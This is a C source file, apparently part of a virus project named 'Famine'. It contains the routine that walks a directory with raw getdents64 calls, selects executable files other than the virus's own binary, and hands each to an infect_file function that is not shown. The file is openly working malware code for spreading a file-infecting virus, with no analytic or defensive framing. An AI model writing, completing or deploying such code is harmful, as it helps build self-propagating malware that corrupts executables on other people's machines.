#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

static inline bool is_infectable(const char *filename, const unsigned char type)
{
	struct stat statbuf;

	if (type != FILE_TYPE)
		return false;
	if (_strcmp(filename, "./famine") == 0)
		return false;

	if (_stat(filename, &statbuf) == -1)
		return false;

	return statbuf.st_mode & S_IXUSR;
}

static inline void update_directory(struct directory *dir, const char *filename)
{
	const int limit = _strlen(filename);

	_bzero(dir->buf, _strlen(dir->buf));

	for (int index = 0; index < dir->size; index++)
		dir->buf[index] = dir->path[index];
	for (int index = 0; index < limit; index++)
		dir->buf[dir->size + index] = filename[index];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void famine(struct directory *dir)
{
	int fd = 0;
	register int index = 0;
	int limit = 0;
	char buf[BUFF_SIZE];
	struct linux_dirent64 *dirp;

	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) == -1)
		return ;
	
	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);

			update_directory(dir, dirp->d_name);

			if (is_infectable(dir->buf, dirp->d_type) == true)
				infect_file(dir->buf);

			index += dirp->d_reclen;
		}
	}

	_close(fd);
}
